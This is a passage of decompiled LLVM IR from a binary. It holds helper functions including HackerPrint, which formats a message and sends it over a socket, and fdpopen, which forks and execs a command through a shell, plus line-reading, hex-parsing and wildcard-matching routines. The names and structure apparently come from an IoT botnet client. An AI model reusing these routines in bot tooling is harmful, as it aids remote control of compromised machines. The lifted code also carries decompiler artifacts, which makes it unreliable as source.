  br label %dec_label_pc_8ce4

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8c00
  %v2_8c68 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c6c = icmp eq i8 %v2_8c68, 99
  br i1 %v7_8c6c, label %dec_label_pc_8c74, label %dec_label_pc_8ce4

dec_label_pc_8c74:                                ; preds = %dec_label_pc_8c64
  %v1_8c78 = add i32 %stack_var_-36.133, 4
  %v1_8c84 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c84 = load i32, i32* %v1_8c84, align 4
  %v1_8c88 = urem i32 %v2_8c84, 256
  store i32 %v1_8c88, i32* %stack_var_-18, align 4
  %v6_8cac = call i32 @prints(i32 %tmp, i8* %v5_8cac, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c78)
  %v2_8cb8 = add i32 %v6_8cac, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8968, %dec_label_pc_89a4
  %stack_var_-32.2 = phi i8* [ %v5_8980, %dec_label_pc_89a4 ], [ %stack_var_-32.435, %dec_label_pc_8968 ]
  %v2_8cc8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8cc8 = zext i8 %v2_8cc8 to i32
  %v3_8cd4 = call i32 @printchar(i32* %arg1, i32 %v3_8cc8)
  %v1_8cdc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8ce4

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_8c64, %dec_label_pc_8c74, %dec_label_pc_8c10, %dec_label_pc_8bac, %dec_label_pc_8b48, %dec_label_pc_8ae4, %dec_label_pc_8aa8, %dec_label_pc_8cc4
  %stack_var_-44.0 = phi i32 [ %v1_8cdc, %dec_label_pc_8cc4 ], [ %v2_8ac8, %dec_label_pc_8aa8 ], [ %v2_8b2c, %dec_label_pc_8ae4 ], [ %v2_8b90, %dec_label_pc_8b48 ], [ %v2_8bf4, %dec_label_pc_8bac ], [ %v2_8c58, %dec_label_pc_8c10 ], [ %v2_8cb8, %dec_label_pc_8c74 ], [ %stack_var_-44.132, %dec_label_pc_8c64 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8cc4 ], [ %v1_8a74, %dec_label_pc_8aa8 ], [ %v1_8ae8, %dec_label_pc_8ae4 ], [ %v1_8b4c, %dec_label_pc_8b48 ], [ %v1_8bb0, %dec_label_pc_8bac ], [ %v1_8c14, %dec_label_pc_8c10 ], [ %v1_8c78, %dec_label_pc_8c74 ], [ %stack_var_-36.133, %dec_label_pc_8c64 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8cc4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8aa8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ae4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b48 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bac ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c10 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c74 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c64 ]
  %v4_8ce4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8ce8 = add i32 %v4_8ce4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8ce8 to i8*
  %v2_8cf4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cf8 = icmp eq i8 %v2_8cf4, 0
  br i1 %v2_8cf8, label %dec_label_pc_8d00, label %dec_label_pc_8968

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8978, %dec_label_pc_8ce4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8978 ], [ %stack_var_-44.0, %dec_label_pc_8ce4 ]
  %v2_8d04 = icmp eq i32* %arg1, null
  br i1 %v2_8d04, label %dec_label_pc_8d1c, label %dec_label_pc_8d0c

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8d00
  %v2_8d10 = load i32, i32* %arg1, align 4
  %v3_8d18 = inttoptr i32 %v2_8d10 to i8*
  store i8 0, i8* %v3_8d18, align 1
  br label %dec_label_pc_8d1c

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_8d0c
  store i32 %v3_8944, i32* @fp, align 4
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89e0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8980, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8d1c, { 1, 0 }
  uselistorder label %dec_label_pc_8d00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8ce4, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8aa8, { 1, 0 }
  uselistorder label %dec_label_pc_8a60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a50, { 1, 0 }
  uselistorder label %dec_label_pc_89dc, { 1, 0 }
  uselistorder label %dec_label_pc_8968, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36164, i32* %stack_var_-20, align 4
  %v2_8d40 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d40, i32* @fp, align 4
  %v4_8d4c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d60 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d4c)
  ret i32 %v4_8d60

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d80 = load i32, i32* @fp, align 4
  store i32 36232, i32* %stack_var_-16, align 4
  %v2_8d84 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d84, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d90 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8da8 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d90)
  store i32 %v3_8d80, i32* @fp, align 4
  ret i32 %v4_8da8

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8dc4 = load i32, i32* @r2, align 4
  store i32 %v6_8dc4, i32* %stack_var_-8, align 4
  %v3_8dc8 = load i32, i32* @fp, align 4
  store i32 36304, i32* %stack_var_-16, align 4
  %v2_8dcc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dcc, i32* @fp, align 4
  %v1_8ddc = call i32 @malloc(i32 2048)
  store i32 %v1_8ddc, i32* %stack_var_-44, align 4
  %v3_8df8 = inttoptr i32 %v1_8ddc to i8*
  %v4_8df8 = call i32 @__GI_memset(i8* %v3_8df8, i32 0, i32 2048)
  %v2_8e04 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e24 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8e04)
  %v3_8e2c = call i32 @strlen(i8* %v3_8df8)
  %v2_8e3c = add i32 %v3_8e2c, %v1_8ddc
  %v3_8e3c = inttoptr i32 %v2_8e3c to i8*
  store i8 10, i8* %v3_8e3c, align 1
  %v5_8e54 = call i32 @zprintf(i32 ptrtoint ([9 x i8]* @global_var_321b8.41 to i32), i32 %v1_8ddc, i32 %v2_8e3c)
  %v3_8e5c = call i32 @strlen(i8* %v3_8df8)
  %v4_8e74 = call i32 @__libc_send(i32 %arg1, i32 %v1_8ddc, i32 %v3_8e5c, i32 16384)
  store i32 %v1_8ddc, i32* @r0, align 4
  %v0_8e84 = call i32 @free()
  store i32 %v3_8dc8, i32* @fp, align 4
  ret i32 %v4_8e74

; uselistorder directives
  uselistorder i8* %v3_8df8, { 1, 0, 2 }
  uselistorder i32 %v1_8ddc, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8ea4 = load i32, i32* @fp, align 4
  store i32 36524, i32* %stack_var_-4, align 4
  %v2_8ea8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8ea8, i32* @fp, align 4
  %v2_8ebc = load i8, i8* %arg2, align 1
  %v7_8ec0 = icmp eq i8 %v2_8ebc, 114
  br i1 %v7_8ec0, label %dec_label_pc_8ed8, label %dec_label_pc_8ec8

dec_label_pc_8ec8:                                ; preds = %entry
  %v2_8ecc = load i8, i8* %arg2, align 1
  %v7_8ed0 = icmp eq i8 %v2_8ecc, 119
  br i1 %v7_8ed0, label %dec_label_pc_8ed8, label %dec_label_pc_8eec

dec_label_pc_8ed8:                                ; preds = %dec_label_pc_8ec8, %entry
  %v1_8edc = add i32 %tmp, 1
  %v1_8ee0 = inttoptr i32 %v1_8edc to i8*
  %v2_8ee0 = load i8, i8* %v1_8ee0, align 1
  %v2_8ee4 = icmp eq i8 %v2_8ee0, 0
  br i1 %v2_8ee4, label %dec_label_pc_8ef8, label %dec_label_pc_8eec

dec_label_pc_8eec:                                ; preds = %dec_label_pc_8ec8, %dec_label_pc_8ed8
  br label %dec_label_pc_9104

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ed8
  %v2_8ef8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8f00 = call i32 @__GI_pipe(i32 %v2_8ef8)
  %v1_8f08 = icmp slt i32 %v1_8f00, 0
  br i1 %v1_8f08, label %dec_label_pc_8f10, label %dec_label_pc_8f1c

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_9104

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v2_8f20 = load i32, i32* @global_var_46c7c.43, align 4
  %v2_8f24 = icmp eq i32 %v2_8f20, 0
  br i1 %v2_8f24, label %dec_label_pc_8f2c, label %dec_label_pc_8fac

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8f1c
  %v0_8f2c = call i32 @getdtablesize()
  %v5_8f40 = icmp sgt i32 %v0_8f2c, 0
  br i1 %v5_8f40, label %dec_label_pc_8f50, label %dec_label_pc_8f44

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8f2c
  br label %dec_label_pc_9104

dec_label_pc_8f50:                                ; preds = %dec_label_pc_8f2c
  %v3_8f54 = mul i32 %v0_8f2c, 4
  %v1_8f5c = call i32 @malloc(i32 %v3_8f54)
  store i32 %v1_8f5c, i32* @global_var_46c7c.43, align 4
  %v2_8f78 = icmp eq i32 %v1_8f5c, 0
  br i1 %v2_8f78, label %dec_label_pc_8f80, label %dec_label_pc_8f8c

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f50
  br label %dec_label_pc_9104

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f50
  %v3_8fa8 = inttoptr i32 %v1_8f5c to i8*
  %v4_8fa8 = call i32 @__GI_memset(i8* %v3_8fa8, i32 0, i32 %v3_8f54)
  br label %dec_label_pc_8fac

dec_label_pc_8fac:                                ; preds = %dec_label_pc_8f1c, %dec_label_pc_8f8c
  %v0_8fac = call i32 @__vfork()
  %v7_8fc4 = icmp eq i32 %v0_8fac, -1
  br i1 %v7_8fc4, label %dec_label_pc_8fdc, label %dec_label_pc_8fcc

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8fac
  %v2_8fd0 = icmp eq i32 %v0_8fac, 0
  br i1 %v2_8fd0, label %dec_label_pc_9000, label %dec_label_pc_90a0

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fac
  %v3_8fdc = load i32, i32* %stack_var_-32, align 4
  %v1_8fe4 = call i32 @__GI___libc_close(i32 %v3_8fdc)
  %v1_8ff0 = call i32 @__GI___libc_close(i32 %tmp3)
  br label %dec_label_pc_9104

dec_label_pc_9000:                                ; preds = %dec_label_pc_8fcc
  %v3_9004 = load i8, i8* %arg2, align 1
  %v7_9008 = icmp eq i8 %v3_9004, 114
  br i1 %v7_9008, label %dec_label_pc_9010, label %dec_label_pc_9048

dec_label_pc_9010:                                ; preds = %dec_label_pc_9000
  %v7_9014 = icmp eq i32 %tmp3, 1
  br i1 %v7_9014, label %dec_label_pc_9038, label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_9010
  %v4_9028 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9034 = call i32 @__GI___libc_close(i32 %tmp3)
  br label %dec_label_pc_9038

dec_label_pc_9038:                                ; preds = %dec_label_pc_9010, %dec_label_pc_901c
  %v3_9038 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__GI___libc_close(i32 %v3_9038)
  br label %dec_label_pc_907c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9000
  %v3_9048 = load i32, i32* %stack_var_-32, align 4
  %v2_904c = icmp eq i32 %v3_9048, 0
  br i1 %v2_904c, label %dec_label_pc_9070, label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %dec_label_pc_9048
  %v4_9060 = call i32 @dup2(i32 %v3_9048, i32 0, i32 %tmp)
  %v3_9064 = load i32, i32* %stack_var_-32, align 4
  %v1_906c = call i32 @__GI___libc_close(i32 %v3_9064)
  br label %dec_label_pc_9070

dec_label_pc_9070:                                ; preds = %dec_label_pc_9048, %dec_label_pc_9054
  %v1_9078 = call i32 @__GI___libc_close(i32 %tmp3)
  br label %dec_label_pc_907c

dec_label_pc_907c:                                ; preds = %dec_label_pc_9038, %dec_label_pc_9070
  %v8_9094 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_321c4.45 to i32), i32 ptrtoint ([3 x i8]* @global_var_321cc.47 to i32), i32 ptrtoint ([3 x i8]* @global_var_321d0.49 to i32), i32 %arg1, i32 0)
  %v1_909c = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_90a0

dec_label_pc_90a0:                                ; preds = %dec_label_pc_8fcc, %dec_label_pc_907c
  %v2_90a4 = load i8, i8* %arg2, align 1
  %v7_90a8 = icmp eq i8 %v2_90a4, 114
  br i1 %v7_90a8, label %dec_label_pc_90b0, label %dec_label_pc_90c8

dec_label_pc_90b0:                                ; preds = %dec_label_pc_90a0
  %v3_90b0 = load i32, i32* %stack_var_-32, align 4
  %v1_90c0 = call i32 @__GI___libc_close(i32 %tmp3)
  br label %dec_label_pc_90dc

dec_label_pc_90c8:                                ; preds = %dec_label_pc_90a0
  %v3_90d0 = load i32, i32* %stack_var_-32, align 4
  %v1_90d8 = call i32 @__GI___libc_close(i32 %v3_90d0)
  br label %dec_label_pc_90dc

dec_label_pc_90dc:                                ; preds = %dec_label_pc_90b0, %dec_label_pc_90c8
  %stack_var_-40.0 = phi i32 [ %v3_90b0, %dec_label_pc_90b0 ], [ %tmp3, %dec_label_pc_90c8 ]
  %v3_90e0 = mul i32 %stack_var_-40.0, 4
  %v2_90ec = load i32, i32* @global_var_46c7c.43, align 4
  %v2_90f0 = add i32 %v2_90ec, %v3_90e0
  %v2_90f8 = inttoptr i32 %v2_90f0 to i32*
  store i32 %v0_8fac, i32* %v2_90f8, align 4
  br label %dec_label_pc_9104

dec_label_pc_9104:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8f80, %dec_label_pc_8f44, %dec_label_pc_8f10, %dec_label_pc_8eec, %dec_label_pc_90dc
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8f80 ], [ -1, %dec_label_pc_8fdc ], [ %stack_var_-40.0, %dec_label_pc_90dc ], [ -1, %dec_label_pc_8f44 ], [ -1, %dec_label_pc_8eec ]
  store i32 %v3_8ea4, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8fac, { 1, 2, 0 }
  uselistorder i32 %v3_8f54, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_9104, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90dc, { 1, 0 }
  uselistorder label %dec_label_pc_90a0, { 1, 0 }
  uselistorder label %dec_label_pc_907c, { 1, 0 }
  uselistorder label %dec_label_pc_9070, { 1, 0 }
  uselistorder label %dec_label_pc_9038, { 1, 0 }
  uselistorder label %dec_label_pc_8fac, { 1, 0 }
  uselistorder label %dec_label_pc_8eec, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_9140 = load i32, i32* @global_var_46c7c.43, align 4
  %v2_9144 = icmp eq i32 %v2_9140, 0
  br i1 %v2_9144, label %dec_label_pc_9298, label %dec_label_pc_914c

dec_label_pc_914c:                                ; preds = %entry
  %v3_9150 = mul i32 %arg1, 4
  %v2_9160 = add i32 %v2_9140, %v3_9150
  %v1_9164 = inttoptr i32 %v2_9160 to i32*
  %v2_9164 = load i32, i32* %v1_9164, align 4
  %v2_9168 = icmp eq i32 %v2_9164, 0
  br i1 %v2_9168, label %dec_label_pc_9298, label %dec_label_pc_917c

dec_label_pc_917c:                                ; preds = %dec_label_pc_914c
  %v1_9180 = call i32 @__GI___libc_close(i32 %arg1)
  %v2_9184 = ptrtoint i32* %stack_var_-36 to i32
  %v2_918c = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9184, i32* @r0, align 4
  %v2_919c = call i32 @__GI_sigaddset(i32 %v2_9184, i32 2)
  store i32 %v2_9184, i32* @r0, align 4
  %v2_91ac = call i32 @__GI_sigaddset(i32 %v2_9184, i32 3)
  store i32 %v2_9184, i32* @r0, align 4
  %v2_91bc = call i32 @__GI_sigaddset(i32 %v2_9184, i32 1)
  %v2_91c4 = ptrtoint i32* %stack_var_-28 to i32
  %v4_91d0 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-36, i32 %v2_91c4)
  %v2_91f0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91d4

dec_label_pc_91d4:                                ; preds = %dec_label_pc_9218, %dec_label_pc_917c
  %v2_91e4 = load i32, i32* @global_var_46c7c.43, align 4
  %v2_91e8 = add i32 %v2_91e4, %v3_9150
  %v1_91ec = inttoptr i32 %v2_91e8 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v3_9200 = call i32 @__libc_waitpid(i32 %v2_91ec, i32 %v2_91f0, i32 0)
  %v3_9210 = icmp eq i32 %v3_9200, -1
  %v8_9210 = icmp eq i32 %v3_9200, -1
  br i1 %v3_9210, label %dec_label_pc_9218, label %dec_label_pc_922c

dec_label_pc_9218:                                ; preds = %dec_label_pc_91d4
  %v0_9218 = call i32 @__GI___errno_location()
  %v1_9220 = inttoptr i32 %v0_9218 to i32*
  %v2_9220 = load i32, i32* %v1_9220, align 4
  %v7_9224 = icmp eq i32 %v2_9220, 4
  br i1 %v7_9224, label %dec_label_pc_91d4, label %dec_label_pc_922c

dec_label_pc_922c:                                ; preds = %dec_label_pc_91d4, %dec_label_pc_9218
  %v4_923c = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-28, i32 0)
  %v3_9244 = mul i32 %tmp6, 4
  %v2_9250 = load i32, i32* @global_var_46c7c.43, align 4
  %v2_9254 = add i32 %v2_9250, %v3_9244
  %v2_925c = inttoptr i32 %v2_9254 to i32*
  store i32 0, i32* %v2_925c, align 4
  br i1 %v8_9210, label %dec_label_pc_9298, label %dec_label_pc_926c

dec_label_pc_926c:                                ; preds = %dec_label_pc_922c
  %v3_926c = load i32, i32* %stack_var_-40, align 4
  %v1_9278 = and i32 %v3_926c, 65280
  %v3_927c1 = udiv i32 %v1_9278, 256
  br label %dec_label_pc_9298

dec_label_pc_9298:                                ; preds = %dec_label_pc_926c, %dec_label_pc_922c, %entry, %dec_label_pc_914c
  %storemerge = phi i32 [ -1, %dec_label_pc_914c ], [ -1, %entry ], [ %v3_927c1, %dec_label_pc_926c ], [ -1, %dec_label_pc_922c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_9184, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v3_9150, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_46c7c.43, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_922c, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9320

dec_label_pc_92e0:                                ; preds = %dec_label_pc_9330
  store i32 %v2_933c, i32* @r3, align 4
  store i32 %v2_933c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_92fc = call i32 @__libc_read(i32 %arg3)
  %v1_930c = add nuw i32 %storemerge25, 1
  %v7_9318 = icmp eq i32 %v1_92fc, 1
  br i1 %v7_9318, label %dec_label_pc_9320, label %dec_label_pc_9350

dec_label_pc_9320:                                ; preds = %entry, %dec_label_pc_92e0
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_930c, %dec_label_pc_92e0 ]
  %v6_932c = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_932c, label %dec_label_pc_9330, label %dec_label_pc_9350

dec_label_pc_9330:                                ; preds = %dec_label_pc_9320
  %v2_933c = add i32 %storemerge25, %arg1
  %v1_9340 = add i32 %v2_933c, -1
  %v1_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_9344 = load i8, i8* %v1_9344, align 1
  %v7_9348 = icmp eq i8 %v2_9344, 10
  br i1 %v7_9348, label %dec_label_pc_9350, label %dec_label_pc_92e0

dec_label_pc_9350:                                ; preds = %dec_label_pc_9330, %dec_label_pc_9320, %dec_label_pc_92e0
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_9330 ], [ 1, %dec_label_pc_9320 ], [ %v1_92fc, %dec_label_pc_92e0 ]
  %v2_9354 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9354, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_933c, { 2, 0, 1 }
  uselistorder i32 %v1_92fc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9320, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93d83 = load i8, i8* %arg1, align 1
  %v2_93dc5 = icmp eq i8 %v2_93d83, 0
  br i1 %v2_93dc5, label %dec_label_pc_93f0, label %dec_label_pc_93e4

dec_label_pc_93a4:                                ; preds = %dec_label_pc_93e4
  %v3_93a8 = mul i32 %stack_var_-20.07, 16
  %v2_93b0 = load i8, i8* %stack_var_-28.06, align 1
  %v3_93b0 = zext i8 %v2_93b0 to i32
  %v4_93bc = mul nuw nsw i32 %v3_93b0, 4
  %v5_93bc = add i32 %v4_93bc, ptrtoint (i32* @global_var_321d4.52 to i32)
  %v6_93bc = inttoptr i32 %v5_93bc to i32*
  %v7_93bc = load i32, i32* %v6_93bc, align 4
  %v2_93c0 = or i32 %v7_93bc, %v3_93a8
  %v1_93cc = add i32 %v4_93d48, 1
  %v5_93d0 = inttoptr i32 %v1_93cc to i8*
  %v2_93d8 = load i8, i8* %v5_93d0, align 1
  %v2_93dc = icmp eq i8 %v2_93d8, 0
  br i1 %v2_93dc, label %dec_label_pc_93f0, label %dec_label_pc_93e4

dec_label_pc_93e4:                                ; preds = %entry, %dec_label_pc_93a4
  %v4_93d48 = phi i32 [ %v1_93cc, %dec_label_pc_93a4 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_93c0, %dec_label_pc_93a4 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_93d0, %dec_label_pc_93a4 ], [ %arg1, %entry ]
  %v1_93e8 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93e8, label %dec_label_pc_93f0, label %dec_label_pc_93a4

dec_label_pc_93f0:                                ; preds = %dec_label_pc_93a4, %dec_label_pc_93e4, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_93c0, %dec_label_pc_93a4 ], [ %stack_var_-20.07, %dec_label_pc_93e4 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93e4, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_940c = load i32, i32* @r4, align 4
  %v6_940c = load i32, i32* @fp, align 4
  store i32 37908, i32* %stack_var_-4, align 4
  %v2_9410 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9410, i32* @fp, align 4
  %v2_9424 = load i8, i8* %arg1, align 1
  %v7_9430 = icmp eq i8 %v2_9424, 42
  br i1 %v7_9430, label %dec_label_pc_9464, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %entry
  %v7_943c = icmp eq i8 %v2_9424, 63
  br i1 %v7_943c, label %dec_label_pc_94d4, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9438
  %v2_9448 = icmp eq i8 %v2_9424, 0
  br i1 %v2_9448, label %dec_label_pc_9454, label %dec_label_pc_952c

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v2_9458 = load i8, i8* %tmp, align 1
  %v3_9458 = zext i8 %v2_9458 to i32
  br label %dec_label_pc_95a0

dec_label_pc_9464:                                ; preds = %entry
  %v1_9468 = add i32 %tmp9, 1
  %v3_9474 = inttoptr i32 %v1_9468 to i8*
  %v4_9474 = call i32 @wildString(i8* %v3_9474, i32 %arg2)
  %v2_947c = icmp eq i32 %v4_9474, 0
  br i1 %v2_947c, label %dec_label_pc_94c0, label %dec_label_pc_9484

dec_label_pc_9484:                                ; preds = %dec_label_pc_9464
  %v2_9488 = load i8, i8* %tmp, align 1
  %v2_948c = icmp eq i8 %v2_9488, 0
  br i1 %v2_948c, label %dec_label_pc_94c8, label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9484
  %v1_9498 = add i32 %arg2, 1
  %v4_94a4 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9498)
  %v2_94ac = icmp eq i32 %v4_94a4, 0
  br i1 %v2_94ac, label %dec_label_pc_94c0, label %dec_label_pc_94c8

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9494, %dec_label_pc_9464
  br label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_9484, %dec_label_pc_9494, %dec_label_pc_94c0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_94c0 ], [ 1, %dec_label_pc_9494 ], [ 1, %dec_label_pc_9484 ]
  br label %dec_label_pc_95a0

dec_label_pc_94d4:                                ; preds = %dec_label_pc_9438
  %v2_94d8 = load i8, i8* %tmp, align 1
